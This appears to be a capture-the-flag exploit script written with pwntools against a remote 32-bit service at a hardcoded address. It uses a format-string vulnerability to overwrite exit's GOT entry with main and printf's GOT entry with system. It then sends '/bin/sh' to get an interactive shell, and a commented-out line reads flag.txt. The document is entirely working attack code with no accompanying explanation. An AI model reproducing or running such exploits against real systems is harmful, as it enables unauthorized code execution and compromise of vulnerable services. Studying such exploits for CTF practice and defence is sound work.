from pwn import *
from zio import *

#init
'''debug = False
if debug:
    target = './pwn2'
else:
    target = ('106.75.18.19',7654)

r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
io = zio(target,timeout=9999,print_read=r_m,print_write=w_m)

if debug:
    gdb.attach(pidof('pwn2')[-1],open('aa'))'''


#-------------------------------------------change exit_got to main_begin_addr,to run printf again
io = remote('106.75.18.19',7654)


def fsb_coverage(converage_data,target_addr):
	addr_high = converage_data >> 16
	addr_low =  converage_data & 0xffff
	print '[*]addr_high=%x' %addr_high
	print '[*]addr_low=%x' %addr_low

	if addr_low < addr_high:
		addr_high = addr_high - addr_low
		formats = '%%%dc%%13$hn%%%dc%%14$hn'%(addr_low,addr_high)
		formats = formats.ljust(28,'A')
		formats += p32(target_addr) + p32(target_addr+2)
	else:
		addr_low = addr_low - addr_high
		formats = '%%%dc%%13$hn%%%dc%%14$hn'%(addr_high,addr_low)
		formats = formats.ljust(28,'A')
		formats += p32(target_addr+2) + p32(target_addr)

	return formats

exit_got = 0x0804a020
main_addr = 0x080485ee

input1 = fsb_coverage(main_addr,exit_got)
io.sendline(input1)
#---------------------------------------------change printf_got to system_plt 
system_plt = 0x8048410
printf_got = 0x804a014
input2 = fsb_coverage(system_plt,printf_got)

sleep(1)
io.sendline(input2)

#---------------------------------------------trigger printf(system_plt),send '/bin/sh'
sleep(1)
io.sendline('/bin/sh')
#io.writeline('cd /home/pwn2;cat flag.txt')
io.interactive()